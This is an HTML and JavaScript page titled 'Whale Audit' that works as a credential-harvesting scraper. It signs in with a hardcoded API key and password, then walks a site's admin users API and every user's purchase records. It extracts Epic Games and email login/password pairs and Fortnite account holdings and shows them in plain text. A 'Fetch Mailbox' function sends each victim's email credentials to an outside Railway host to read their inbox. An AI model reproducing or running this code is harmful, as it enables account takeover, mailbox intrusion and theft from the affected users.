<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Whale Audit v12.0 | Unlimited Scraper</title>
    <style>
        :root {
            --bg: #0d1117; --card-bg: #161b22; --accent: #58a6ff;
            --green: #238636; --red: #da3633; --border: #30363d; --text: #c9d1d9;
        }
        body { margin: 0; background: var(--bg); color: var(--text); font-family: -apple-system, system-ui, sans-serif; padding: 20px; line-height: 1.5; }
        
        .header-section { max-width: 1100px; margin: 0 auto 30px auto; }
        .stats-bar { display: flex; justify-content: space-around; background: var(--card-bg); padding: 20px; border-radius: 12px; border: 1px solid var(--border); margin-bottom: 20px; }
        .stat-num { display: block; font-size: 1.4rem; font-weight: bold; color: var(--accent); }

        .prog-container { width: 100%; height: 12px; background: #21262d; border-radius: 6px; margin: 10px 0; display: none; overflow: hidden; border: 1px solid var(--border); }
        #bar { width: 0%; height: 100%; background: linear-gradient(90deg, #58a6ff, #1f6feb); transition: width 0.2s; }

        .controls { display: flex; gap: 10px; align-items: center; justify-content: center; flex-wrap: wrap; margin-bottom: 30px; background: var(--card-bg); padding: 15px; border-radius: 12px; border: 1px solid var(--border); }
        .btn { padding: 10px 18px; border-radius: 6px; border: 1px solid var(--border); background: #21262d; color: white; cursor: pointer; font-weight: 600; transition: 0.2s; font-size: 0.85rem; }
        .btn-refresh { background: var(--green); border-color: #2ea043; }
        .btn-export { background: #30363d; color: var(--accent); }
        
        input[type="text"], select { background: #0d1117; border: 1px solid var(--border); color: white; padding: 10px; border-radius: 6px; outline: none; }
        #search { width: 300px; }

        .container { max-width: 1100px; margin: 0 auto; display: flex; flex-direction: column; gap: 15px; }
        .account-panel { background: var(--card-bg); border: 1px solid var(--border); border-radius: 12px; padding: 25px; transition: border-color 0.2s; width: 100%; box-sizing: border-box; }
        .account-panel:hover { border-color: var(--accent); }
        
        .panel-header { display: flex; justify-content: space-between; align-items: flex-start; border-bottom: 1px solid var(--border); padding-bottom: 15px; margin-bottom: 15px; }
        .panel-header h2 { margin: 0; font-size: 1.3rem; color: var(--accent); }
        .badge { padding: 4px 10px; border-radius: 12px; font-size: 0.75rem; font-weight: bold; margin-left: 5px; }
        .badge-admin { background: #ff0000; color: #ffffff; }
        .badge-banned { background: #442323; color: #ff7b72; }

        .data-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
        .data-group h4 { margin: 0 0 10px 0; font-size: 0.8rem; text-transform: uppercase; color: #8b949e; letter-spacing: 1px; }
        .row { display: flex; justify-content: space-between; margin-bottom: 5px; font-size: 0.9rem; }
        .val { font-family: monospace; color: #f0f6fc; word-break: break-all; }

        .mail-section { margin-top: 20px; }
        .mail-toggle-btn { width: 100%; background: #21262d; padding: 10px; border: 1px solid var(--border); color: var(--accent); font-weight: bold; border-radius: 6px; cursor: pointer; }
        .mail-container { display: none; margin-top: 15px; border: 1px solid var(--border); border-radius: 8px; background: #0d1117; padding: 15px; }
        iframe { width: 100%; height: 400px; border: none; background: white; border-radius: 6px; margin-top: 10px; display: none;}
        #fileInput { display: none; }
    </style>
</head>
<body>

<div class="header-section">
    <div class="stats-bar">
        <div class="stat-item">Accounts Found<span id="stat-count" class="stat-num">0</span></div>
        <div class="stat-item">Site Revenue<span id="stat-rev" class="stat-num">$0.00</span></div>
        <div class="stat-item">Status<span id="status-text" class="stat-num" style="font-size: 1rem; color: #8b949e;">Idle</span></div>
    </div>
    <div class="prog-container" id="progWrapper"><div id="bar"></div></div>
</div>

<div class="controls">
    <input type="text" id="search" placeholder="Search anything (IDs, Emails, Logins...)" oninput="render()">
    
    <select id="sortOption" onchange="render()">
        <option value="newest">Sort: Newest First</option>
        <option value="admin">Sort: Admins First</option>
        <option value="banned">Sort: Banned First</option>
        <option value="bal_high">Balance: High to Low</option>
        <option value="spent_high">Spent: High to Low</option>
        <option value="fn_high">V-Bucks: High to Low</option>
        <option value="skins_high">Skins: High to Low</option>
    </select>

    <button class="btn btn-refresh" onclick="masterRefresh()">üîÑ Deep Scrape (All)</button>
    <button class="btn" onclick="document.getElementById('fileInput').click()">üì• Import</button>
    <button class="btn btn-export" onclick="exportJSON()">üì§ Export JSON</button>
    <button class="btn" onclick="clearData()" style="color:var(--red)">üóëÔ∏è Clear</button>
    <input type="file" id="fileInput" accept=".json" onchange="importJSON(event)">
</div>

<div class="container" id="mainContainer"></div>

<script>
const CONFIG = {
    AUTH_URL: "https://vjkqkrprbelmozgirnwb.supabase.co/auth/v1/token?grant_type=password",
    API_KEY: "sb_publishable_PNFkJ2efdfFkzhWiQG1_yg_qx_aOJmY",
    BASE: "https://deepsense.win/api/admin/users",
    USER: "swagcell67@gmail.com",
    PASS: "T8ertot2023!"
};

let auditData = JSON.parse(localStorage.getItem('audit_v12_storage') || "[]");
let currentJWT = "";

async function fetchNewToken() {
    const r = await fetch(CONFIG.AUTH_URL, {
        method: 'POST',
        headers: { 'apikey': CONFIG.API_KEY, 'authorization': `Bearer ${CONFIG.API_KEY}`, 'content-type': 'application/json' },
        body: JSON.stringify({ email: CONFIG.USER, password: CONFIG.PASS })
    });
    const d = await r.json();
    return d.access_token;
}

async function masterRefresh() {
    const status = document.getElementById('status-text');
    const bar = document.getElementById('bar');
    const wrapper = document.getElementById('progWrapper');
    wrapper.style.display = 'block';
    status.innerText = "Authenticating...";
    
    try {
        currentJWT = await fetchNewToken();
        let allUsers = [];
        let page = 1;
        let hasMore = true;

        // --- UNLIMITED PAGINATION LOOP ---
        while(hasMore) {
            status.innerText = `Indexing Users: Found ${allUsers.length}...`;
            const r = await fetch(`${CONFIG.BASE}?page=${page}&limit=100&sort=newest`, { 
                headers: { 'Authorization': `Bearer ${currentJWT}` } 
            });
            const d = await r.json();
            
            if(!d.users || d.users.length === 0) {
                hasMore = false;
            } else {
                allUsers.push(...d.users);
                page++;
            }
            // Artificial limit to prevent browser crash if API is infinite (set to 5000 users)
            if(allUsers.length > 5000) hasMore = false; 
        }

        let results = [];
        const total = allUsers.length;

        // --- REAL-TIME TRACKING SCRAPE ---
        for (let i = 0; i < total; i += 5) {
            const chunk = allUsers.slice(i, i + 5);
            status.innerText = `Scraping Profile: ${i} / ${total}`;
            bar.style.width = `${(i / total) * 100}%`;

            await Promise.all(chunk.map(async (u) => {
                try {
                    const pr = await fetch(`${CONFIG.BASE}/${u.id}/purchases`, { headers: { 'Authorization': `Bearer ${currentJWT}` } });
                    const pd = await pr.json();
                    (pd.purchases || []).forEach(p => {
                        const acc = p.account_data || {};
                        const parts = (acc.copyFormatData?.login_data || "").split(':');
                        results.push({
                            user_id: u.id, user_email: u.email, user_site_balance: parseFloat(u.balance) || 0,
                            total_spent_on_site: parseFloat(u.total_spent) || 0, is_admin: u.is_admin,
                            is_banned: u.is_banned || false, item_id: p.lzt_item_id,
                            epic_login: parts[0] || 'N/A', epic_password: parts[1] || 'N/A',
                            email_login: parts[2] || 'N/A', email_password: parts[3] || 'N/A',
                            fortnite_balance: parseInt(acc.fortnite_balance) || 0,
                            fortnite_username: acc.fortnite_username || "Unknown",
                            skin_count: parseInt(acc.fortnite_skin_count) || 0
                        });
                    });
                } catch(e) {}
            }));
        }

        auditData = results;
        saveAndRender();
        status.innerText = `Complete: ${auditData.length} Items`;
    } catch(err) { 
        status.innerText = "Error!";
        console.error(err);
    }
    setTimeout(() => { 
        wrapper.style.display = 'none';
        bar.style.width = '0%';
    }, 2000);
}

function render() {
    const container = document.getElementById('mainContainer');
    const term = document.getElementById('search').value.toLowerCase();
    const sort = document.getElementById('sortOption').value;

    let filtered = auditData.filter(x => {
        return `${x.fortnite_username} ${x.user_email} ${x.item_id} ${x.epic_login}`.toLowerCase().includes(term);
    });

    filtered.sort((a, b) => {
        if (sort === "admin") return b.is_admin - a.is_admin;
        if (sort === "banned") return b.is_banned - a.is_banned;
        if (sort === "bal_high") return b.user_site_balance - a.user_site_balance;
        if (sort === "spent_high") return b.total_spent_on_site - a.total_spent_on_site;
        if (sort === "fn_high") return b.fortnite_balance - a.fortnite_balance;
        if (sort === "skins_high") return b.skin_count - a.skin_count;
        return 0;
    });

    document.getElementById('stat-count').innerText = filtered.length;
    document.getElementById('stat-rev').innerText = `$${filtered.reduce((a, b) => a + b.total_spent_on_site, 0).toFixed(2)}`;

    container.innerHTML = filtered.map(item => `
        <div class="account-panel">
            <div class="panel-header">
                <div>
                    <h2>${item.fortnite_username}</h2>
                    <span style="font-size:0.8rem; color:#8b949e;">ID: ${item.item_id} | User: ${item.user_id}</span>
                </div>
                <div>
                    ${item.is_admin ? '<span class="badge badge-admin">ADMIN</span>' : ''}
                    ${item.is_banned ? '<span class="badge badge-banned">BANNED</span>' : ''}
                </div>
            </div>
            <div class="data-grid">
                <div class="data-group">
                    <h4>Site Profile</h4>
                    <div class="row"><span>Email:</span><span class="val">${item.user_email}</span></div>
                    <div class="row"><span>Balance:</span><span class="val" style="color:var(--green)">$${item.user_site_balance.toFixed(2)}</span></div>
                    <div class="row"><span>Total Spent:</span><span class="val" style="color:var(--red)">$${item.total_spent_on_site.toFixed(2)}</span></div>
                </div>
                <div class="data-group">
                    <h4>Loot</h4>
                    <div class="row"><span>Skins:</span><span class="val">${item.skin_count}</span></div>
                    <div class="row"><span>V-Bucks:</span><span class="val">${item.fortnite_balance}</span></div>
                </div>
            </div>
            <div class="data-group" style="margin-top:15px; border-top:1px solid #21262d; padding-top:10px;">
                <h4>Credentials</h4>
                <div class="row"><span>Epic:</span><span class="val">${item.epic_login} : ${item.epic_password}</span></div>
                <div class="row"><span>Mail:</span><span class="val">${item.email_login} : ${item.email_password}</span></div>
            </div>
            <div class="mail-section">
                <button class="mail-toggle-btn" onclick="toggleMailBox('${item.item_id}', '${item.email_login}', '${item.email_password}')">üì© Fetch Mailbox</button>
                <div id="mail-zone-${item.item_id}" class="mail-container"><div id="list-${item.item_id}"></div></div>
            </div>
        </div>
    `).join('');
}

function exportJSON() {
    const blob = new Blob([JSON.stringify(auditData, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `audit_full_export_${Date.now()}.json`;
    a.click();
}

function importJSON(e) {
    const reader = new FileReader();
    reader.onload = (ev) => { auditData = JSON.parse(ev.target.result); saveAndRender(); };
    reader.readAsText(e.target.files[0]);
}

async function toggleMailBox(id, email, pass) {
    const zone = document.getElementById(`mail-zone-${id}`);
    const list = document.getElementById(`list-${id}`);
    if(zone.style.display === 'block') { zone.style.display = 'none'; return; }
    zone.style.display = 'block'; list.innerHTML = "Fetching emails...";
    try {
        const r = await fetch(`https://rthbertg-production.up.railway.app/api/fetch-emails?email=${encodeURIComponent(email)}&password=${encodeURIComponent(pass)}`);
        const d = await r.json();
        list.innerHTML = (d.emails || []).map((m, i) => `
            <div style="border-bottom:1px solid #30363d; padding:10px 0;">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <b style="font-size:0.85rem;">${m.subject}</b>
                    <button class="btn" style="padding:4px 8px; font-size:0.7rem;" onclick="this.parentElement.nextElementSibling.style.display='block'">View</button>
                </div>
                <iframe sandbox srcdoc="${m.html.replace(/"/g, '&quot;')}" style="display:none; width:100%; height:300px; margin-top:10px; border-radius:4px;"></iframe>
            </div>
        `).join('') || "No emails found.";
    } catch(e) { list.innerHTML = "Mail server error."; }
}

function saveAndRender() { localStorage.setItem('audit_v12_storage', JSON.stringify(auditData)); render(); }
function clearData() { if(confirm("This will wipe all local data. Continue?")) { auditData = []; saveAndRender(); } }
window.onload = render;
</script>
</body>
</html>
